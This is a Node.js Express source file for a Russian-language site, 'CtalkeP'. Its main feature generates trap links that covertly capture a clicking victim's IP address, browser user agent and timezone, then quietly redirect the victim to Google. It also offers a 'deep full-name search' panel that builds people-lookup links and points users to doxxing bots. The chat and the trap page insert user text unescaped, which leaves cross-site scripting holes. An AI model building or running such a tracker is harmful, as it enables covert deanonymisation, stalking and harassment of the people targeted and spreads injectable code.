const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// === ХРАНИЛИЩА В ПАМЯТИ ===
let currentTrap = null;     // Активная ловушка (всегда только одна!)
let lastResult = null;      // Последний успешный улов IP
let globalArticles = [
    {
        id: "promo",
        title: "Портал запущен!",
        desc: "Система готова к работе.",
        content: "Все модули CtalkeP активированы. Чат переведен на протокол коротких опросов для 100% стабильности."
    }
];
let chatMessages = [];      // Храним последние 30 сообщений для стабильной синхронизации

// === АВТОПИНГЕР ДЛЯ RENDER ===
const APP_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
setInterval(() => {
    axios.get(`${APP_URL}/ping`)
        .then(() => console.log('[CtalkeP] Автопинг отправлен.'))
        .catch(err => console.log('[CtalkeP] Ошибка автопинга (игнорируем):', err.message));
}, 600000); // 10 минут

app.get('/ping', (req, res) => res.send('pong'));

// === ГЛАВНЫЙ ИНТЕРФЕЙС ===
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CtalkeP | Premium Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #e5e7eb; }
        .neon-border { box-shadow: 0 0 15px rgba(59, 130, 246, 0.25); }
        .neon-text { text-shadow: 0 0 8px rgba(59, 130, 246, 0.6); }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #2a2a2a; }
    </style>
</head>
<body class="font-sans min-h-screen flex flex-col justify-between">

    <header class="border-b border-zinc-900 bg-[#0a0a0a] p-4 sticky top-0 z-50">
        <div class="max-w-6xl mx-auto flex flex-wrap justify-between items-center gap-4">
            <h1 class="text-2xl font-black text-blue-500 tracking-widest neon-text">CtalkeP</h1>
            <div class="flex items-center gap-4">
                <span class="text-xs bg-zinc-900 px-3 py-1.5 rounded-lg border border-zinc-800 text-zinc-400">
                    Реклама: <span class="text-red-500 font-bold">бесплатный дэфф - @defscool</span>
                </span>
                <span class="text-yellow-500 font-bold bg-yellow-950/30 px-3 py-1.5 rounded-lg border border-yellow-900/40" id="balanceDisplay">Баланс: $0.00</span>
            </div>
        </div>
    </header>

    <main class="max-w-6xl mx-auto p-4 w-full flex-grow grid grid-cols-1 md:grid-cols-3 gap-6">
        
        <div class="space-y-6">
            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                <h2 class="text-md font-bold mb-3 text-blue-400 tracking-wide uppercase">Локальный профиль</h2>
                <div class="space-y-3">
                    <input type="text" id="nicknameInput" placeholder="Ваш никнейм" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-sm text-white outline-none focus:border-blue-500 transition">
                    <button onclick="saveProfile()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-lg text-sm transition">Сохранить</button>
                </div>
            </div>

            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                <h2 class="text-md font-bold mb-1 text-red-500 tracking-wide uppercase">УЗНАТЬ IP-адрес</h2>
                <p class="text-xs text-zinc-500 mb-4">Предыдущая ссылка удаляется автоматически при новой генерации.</p>
                
                <div class="space-y-3 mb-4">
                    <label class="text-xs text-zinc-400 block">Текст на экране жертвы (оставь пустым для скрытности):</label>
                    <input type="text" id="trapMessageInput" placeholder="Например: Я узнал твой IP))" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-xs text-white outline-none focus:border-red-500 transition">
                </div>

                <button onclick="generateTrap()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 rounded-lg text-sm transition">Сгенерировать ссылку</button>
                
                <div id="trapArea" class="hidden mt-4 space-y-3">
                    <div class="p-2 bg-zinc-900 rounded-lg border border-zinc-800 flex items-center justify-between">
                        <input type="text" id="trapUrl" readonly class="bg-transparent text-xs text-green-400 outline-none w-full">
                    </div>
                    <div id="trapStatus" class="text-xs text-yellow-500 animate-pulse bg-yellow-950/10 p-3 rounded-lg border border-yellow-900/30">
                        Ожидание перехода...
                    </div>
                </div>
            </div>

            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                <h2 class="text-md font-bold mb-3 text-indigo-400 tracking-wide uppercase">Глубокий Поиск ФИО</h2>
                <input type="text" id="fioInput" placeholder="Иванов Иван Иванович" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 mb-3 text-sm text-white outline-none focus:border-indigo-500">
                <button onclick="searchFIO()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2 rounded-lg text-sm transition">Анализировать информацию</button>
                <div id="fioResults" class="mt-4 space-y-2 hidden"></div>
            </div>
        </div>

        <div class="space-y-6">
            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                <h2 class="text-md font-bold mb-3 text-emerald-400 tracking-wide uppercase">Создать статью (+$0.50)</h2>
                <div class="space-y-3">
                    <input type="text" id="artTitle" placeholder="Заголовок" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white">
                    <input type="text" id="artDesc" placeholder="Краткое описание" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white">
                    <textarea id="artContent" rows="4" placeholder="Основной текст статьи..." class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white"></textarea>
                    <button onclick="publishArticle()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 rounded-lg text-sm transition">Опубликовать</button>
                </div>
            </div>

            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                <h2 class="text-md font-bold mb-3 text-blue-400 tracking-wide uppercase">Публичные статьи</h2>
                <div id="articlesList" class="space-y-3 max-h-64 overflow-y-auto pr-1"></div>
            </div>
        </div>

        <div class="space-y-6">
            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                <h2 class="text-md font-bold mb-3 text-yellow-500 tracking-wide uppercase">Магазин привилегий</h2>
                <div class="flex justify-between items-center bg-zinc-950 p-3 rounded-lg border border-zinc-900">
                    <div>
                        <div class="font-bold text-sm text-white">[СТ] Элитный Тэг</div>
                        <div class="text-xs text-zinc-500">Выделяет ваши сообщения</div>
                    </div>
                    <button onclick="buyTag()" class="bg-yellow-600 hover:bg-yellow-700 text-white text-xs font-bold px-3 py-2 rounded-lg transition">$15.00</button>
                </div>
            </div>

            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border flex flex-col h-[340px]">
                <h2 class="text-md font-bold mb-2 text-purple-400 tracking-wide uppercase">Анонимный чат</h2>
                <div id="chatBox" class="flex-grow overflow-y-auto bg-[#050505] p-3 rounded-lg border border-zinc-900 text-sm space-y-2 mb-3"></div>
                <div class="flex gap-2">
                    <input type="text" id="chatMessage" placeholder="Напишите сообщение..." class="flex-grow bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-sm text-white outline-none">
                    <button onclick="sendMessage()" class="bg-purple-600 hover:bg-purple-700 px-4 rounded-lg text-sm font-bold text-white transition">Отправить</button>
                </div>
            </div>

            <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                <h2 class="text-md font-bold mb-2 text-zinc-400 tracking-wide uppercase">Статистика активности</h2>
                <div id="statsBox" class="text-sm"></div>
            </div>
        </div>
    </main>

    <div id="articleModal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center p-4 z-50">
        <div class="bg-[#0a0a0a] p-6 rounded-xl border border-zinc-800 max-w-lg w-full">
            <h2 id="modalTitle" class="text-xl font-bold text-blue-400 mb-2"></h2>
            <div id="modalContent" class="text-zinc-300 text-sm whitespace-pre-line mb-4 max-h-96 overflow-y-auto"></div>
            <button onclick="closeModal()" class="w-full bg-zinc-800 hover:bg-zinc-700 py-2 rounded-lg text-white font-bold transition">Закрыть</button>
        </div>
    </div>

    <footer class="text-center p-4 text-xs text-zinc-700 border-t border-zinc-950 bg-[#030303]">
        CtalkeP Portal. Код оптимизирован под жесткие лимиты серверов.
    </footer>

    <script>
        let myNickname = localStorage.getItem('nickname') || 'Анонимный пользователь';
        let myBalance = parseFloat(localStorage.getItem('balance')) || 0.0;
        let hasTag = localStorage.getItem('hasTag') === 'true';
        let dailyVisits = parseInt(localStorage.getItem('dailyVisits')) || 0;
        let lastVisitDate = localStorage.getItem('lastVisitDate');
        let localArticles = JSON.parse(localStorage.getItem('saved_articles')) || [];

        document.getElementById('nicknameInput').value = myNickname === 'Анонимный пользователь' ? '' : myNickname;
        updateUI();

        const today = new Date().toDateString();
        if (lastVisitDate !== today) {
            dailyVisits += 1;
            localStorage.setItem('dailyVisits', dailyVisits);
            localStorage.setItem('lastVisitDate', today);
        }

        function updateUI() {
            document.getElementById('balanceDisplay').textContent = 'Баланс: $' + myBalance.toFixed(2);
            document.getElementById('statsBox').innerHTML = '<div class="flex justify-between items-center"><span>👤 ' + myNickname + '</span><span class="text-emerald-400 font-bold">' + dailyVisits + ' вх.</span></div>';
        }

        function saveProfile() {
            const input = document.getElementById('nicknameInput').value.trim();
            myNickname = input || 'Анонимный пользователь';
            localStorage.setItem('nickname', myNickname);
            updateUI();
            alert('Профиль обновлен локально!');
        }

        // === ПОИСК ФИО УЛУЧШЕННЫЙ ===
        function searchFIO() {
            const query = document.getElementById('fioInput').value.trim();
            if (!query) return alert('Введите ФИО для анализа!');
            
            const resultsBox = document.getElementById('fioResults');
            resultsBox.classList.remove('hidden');

            const encoded = encodeURIComponent(query);
            
            resultsBox.innerHTML = \`
                <div class="p-3 bg-zinc-950 rounded-lg border border-zinc-900 text-xs space-y-2">
                    <div class="text-zinc-400 font-bold border-b border-zinc-900 pb-1">Результаты анализа для: "\${query}"</div>
                    <a href="https://vk.com/people/\${encoded}" target="_blank" class="block text-blue-400 hover:underline">🌐 Найти профиль ВКонтакте (Прямой поиск)</a>
                    <a href="https://t.me/search?q=\${encoded}" target="_blank" class="block text-cyan-400 hover:underline">💬 Поиск упоминаний в Telegram-каналах</a>
                    <a href="https://yandex.ru/search/?text=\${encoded}" target="_blank" class="block text-amber-500 hover:underline">🔍 Пробить в Yandex (Документы, Упоминания)</a>
                    <a href="https://www.google.com/search?q=\${encoded}" target="_blank" class="block text-red-400 hover:underline">🔍 Пробить в Google (Социальные связи)</a>
                    <div class="text-[10px] text-zinc-600 mt-2">Рекомендуется также скопировать ФИО и отправить в Telegram-боты класса "Глаз Бога".</div>
                </div>
            \`;
        }

        // === УЗНАТЬ IP (ЛОГИКА С ПЕРВОГО РАЗА) ===
        let trapCheckInterval = null;

        async function generateTrap() {
            const msgInput = document.getElementById('trapMessageInput').value.trim();
            
            const res = await fetch('/api/ip/create', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ customText: msgInput })
            });
            const data = await res.json();
            
            if(data.success) {
                const trapArea = document.getElementById('trapArea');
                const trapUrl = document.getElementById('trapUrl');
                const trapStatus = document.getElementById('trapStatus');
                
                trapArea.classList.remove('hidden');
                trapUrl.value = data.link;
                trapStatus.textContent = "Ссылка активна. Ждем клика...";
                trapStatus.className = "text-xs text-yellow-500 animate-pulse bg-yellow-950/10 p-3 rounded-lg border border-yellow-900/30";
                
                if (trapCheckInterval) clearInterval(trapCheckInterval);
                
                // Проверяем статус ловушки каждые 2 секунды
                trapCheckInterval = setInterval(async () => {
                    const statusRes = await fetch('/api/ip/status');
                    const statusData = await statusRes.json();
                    
                    if (statusData.status === 'caught') {
                        clearInterval(trapCheckInterval);
                        trapStatus.className = "text-xs text-green-400 bg-green-950/10 p-3 rounded-lg border border-green-900/30";
                        trapStatus.innerHTML = '<strong>ДАННЫЕ ПОЛУЧЕНЫ!</strong><br>IP: ' + statusData.data.ip + '<br>Устройство: ' + statusData.data.device.substring(0,60) + '...<br>Временная зона: ' + statusData.data.timezone;
                    } else if (statusData.status === 'expired') {
                        clearInterval(trapCheckInterval);
                        trapStatus.className = "text-xs text-red-500 bg-red-950/10 p-3 rounded-lg border border-red-900/30";
                        trapStatus.textContent = "Ссылка была аннулирована или удалена.";
                    }
                }, 2000);
            }
        }

        // === СТАТЬИ ===
        async function loadArticles() {
            try {
                const res = await fetch('/api/articles');
                const serverArticles = await res.json();
                
                const allArticles = [...serverArticles];
                localArticles.forEach(localArt => {
                    if (!allArticles.some(a => a.id === localArt.id)) {
                        allArticles.push(localArt);
                    }
                });

                const list = document.getElementById('articlesList');
                list.innerHTML = '';
                
                allArticles.forEach(art => {
                    const div = document.createElement('div');
                    div.className = "bg-zinc-950 p-3 rounded-lg border border-zinc-900 hover:border-zinc-800 cursor-pointer transition";
                    div.onclick = () => openArticle(art);
                    div.innerHTML = '<h3 class="font-bold text-sm text-white">' + art.title + '</h3><p class="text-xs text-zinc-500">' + art.desc + '</p>';
                    list.appendChild(div);
                });
            } catch (e) {
                console.log('Загрузка статей из локального кэша.');
            }
        }

        async function publishArticle() {
            const title = document.getElementById('artTitle').value.trim();
            const desc = document.getElementById('artDesc').value.trim();
            const content = document.getElementById('artContent').value.trim();
            
            if(!title || !content) return alert('Укажите название и содержание статьи!');
            
            const newArt = {
                id: Math.random().toString(36).substring(2, 10),
                title,
                desc: desc || "Без описания",
                content
            };

            localArticles.push(newArt);
            localStorage.setItem('saved_articles', JSON.stringify(localArticles));

            try {
                await fetch('/api/articles', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(newArt)
                });
            } catch (e) { console.log('Не удалось передать статью на сервер.'); }

            myBalance += 0.50;
            localStorage.setItem('balance', myBalance);
            updateUI();
            
            document.getElementById('artTitle').value = '';
            document.getElementById('artDesc').value = '';
            document.getElementById('artContent').value = '';
            alert('Статья создана! Баланс пополнен.');
            loadArticles();
        }

        function openArticle(art) {
            document.getElementById('modalTitle').textContent = art.title;
            document.getElementById('modalContent').textContent = art.content;
            document.getElementById('articleModal').classList.remove('hidden');
        }

        function closeModal() {
            document.getElementById('articleModal').classList.add('hidden');
        }

        // === ЧАТ: УЛЬТРА-СТАБИЛЬНЫЙ ОПРОС (НЕТ СБОЯМ!) ===
        async function fetchMessages() {
            try {
                const res = await fetch('/api/chat/messages');
                const data = await res.json();
                const chatBox = document.getElementById('chatBox');
                
                // Сверяем количество, чтобы не перерисовывать постоянно
                const currentCount = chatBox.children.length;
                if (data.length !== currentCount) {
                    chatBox.innerHTML = '';
                    data.forEach(msg => {
                        const div = document.createElement('div');
                        const tagSpan = msg.tag ? '<span class="text-yellow-400 font-bold mr-1">' + msg.tag + '</span>' : '';
                        div.innerHTML = '<span class="text-zinc-600 text-[10px]">[' + msg.time + ']</span> ' + tagSpan + '<strong class="text-purple-400">' + msg.username + ':</strong> <span class="text-zinc-200">' + msg.text + '</span>';
                        chatBox.appendChild(div);
                    });
                    chatBox.scrollTop = chatBox.scrollHeight;
                }
            } catch (e) { console.log('Сбой опроса чата.'); }
        }

        // Опрашиваем чат каждые 2 секунды (работает безотказно)
        setInterval(fetchMessages, 2000);

        async function sendMessage() {
            const input = document.getElementById('chatMessage');
            const text = input.value.trim();
            if(!text) return;
            
            await fetch('/api/chat/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: myNickname,
                    text: text,
                    tag: hasTag ? '[СТ]' : ''
                })
            });
            input.value = '';
            fetchMessages();
        }

        function buyTag() {
            if(hasTag) return alert('Вы уже купили тэг!');
            if(myBalance < 15.00) return alert('Недостаточно денег. Пишите статьи для заработка.');
            myBalance -= 15.00;
            hasTag = true;
            localStorage.setItem('balance', myBalance);
            localStorage.setItem('hasTag', 'true');
            updateUI();
            alert('Тэг успешно куплен и активен!');
        }

        loadArticles();
        fetchMessages();
    </script>
</body>
</html>
    `);
});

// === ФУНКЦИОНАЛ: УЗНАТЬ IP ===

app.post('/api/ip/create', (req, res) => {
    const id = Math.random().toString(36).substring(2, 8);
    
    // Создаем НОВУЮ ловушку и автоматически аннулируем СТАРУЮ
    currentTrap = {
        id: id,
        createdAt: Date.now(),
        customText: req.body.customText || ""
    };
    
    // Очищаем старые результаты
    lastResult = null;
    
    res.json({ success: true, link: `${APP_URL}/t/${id}`, id });
});

app.get('/t/:id', (req, res) => {
    const id = req.params.id;
    
    // Если ловушка не совпадает с текущей активной — она недействительна
    if (!currentTrap || currentTrap.id !== id) {
        return res.send('<body style="background:#050505;color:#e5e7eb;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;"><h1>Ссылка устарела</h1></body>');
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const customTextHtml = currentTrap.customText 
        ? `<h1 style="font-size: 2.5rem; font-weight: 800; text-align: center; max-width: 80%; text-shadow: 0 0 10px rgba(255,0,0,0.5);">${currentTrap.customText}</h1>` 
        : ``;

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Загрузка...</title>
            <meta charset="utf-8">
        </head>
        <body style="background: #050505; color: #e5e7eb; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
            ${customTextHtml}
            <script>
                const data = {
                    ip: "${ip}",
                    device: navigator.userAgent,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    city: "Определяется"
                };
                
                const host = window.location.protocol + '//' + window.location.host;
                
                // Делаем мгновенную отправку данных
                fetch(host + '/api/ip/collect/${id}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    // Если текста нет, тихо уводим на Google
                    if ("${currentTrap.customText}" === "") {
                        window.location.href = "https://www.google.com";
                    }
                }).catch(() => {
                    if ("${currentTrap.customText}" === "") {
                        window.location.href = "https://www.google.com";
                    }
                });
            </script>
        </body>
        </html>
    `);
});

app.post('/api/ip/collect/:id', (req, res) => {
    const id = req.params.id;
    if (currentTrap && currentTrap.id === id) {
        lastResult = {
            ip: req.body.ip,
            device: req.body.device,
            timezone: req.body.timezone,
            city: req.body.city,
            time: new Date().toLocaleTimeString()
        };
        // Полностью удаляем ловушку сразу после сбора! Повторно перейти по ней нельзя
        currentTrap = null;
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "Ссылка больше неактивна" });
    }
});

app.get('/api/ip/status', (req, res) => {
    if (lastResult) {
        res.json({ status: 'caught', data: lastResult });
    } else if (currentTrap) {
        res.json({ status: 'pending' });
    } else {
        res.json({ status: 'expired' });
    }
});

// === ФУНКЦИОНАЛ: СТАТЬИ ===

app.get('/api/articles', (req, res) => {
    res.json(globalArticles);
});

app.post('/api/articles', (req, res) => {
    const { id, title, desc, content } = req.body;
    if (!title || !content) return res.status(400).json({ error: "No data" });
    const articleId = id || Math.random().toString(36).substring(2, 10);
    const newArticle = { id: articleId, title, desc: desc || "Без описания", content };
    globalArticles.push(newArticle);
    res.json({ success: true, article: newArticle });
});

// === СТАБИЛЬНЫЙ ЧАТ НА ОПРОСАХ ===

app.get('/api/chat/messages', (req, res) => {
    res.json(chatMessages);
});

app.post('/api/chat/send', (req, res) => {
    const { username, text, tag } = req.body;
    if(!username || !text) return res.status(400).json({ error: "Empty fields" });
    
    const message = { username, text, tag, time: new Date().toLocaleTimeString() };
    chatMessages.push(message);
    
    // Ограничиваем историю чата на сервере (храним последние 30 записей для минимизации нагрузки)
    if (chatMessages.length > 30) {
        chatMessages.shift();
    }
    
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`[CtalkeP] Система полностью перезапущена и оптимизирована.`);
});
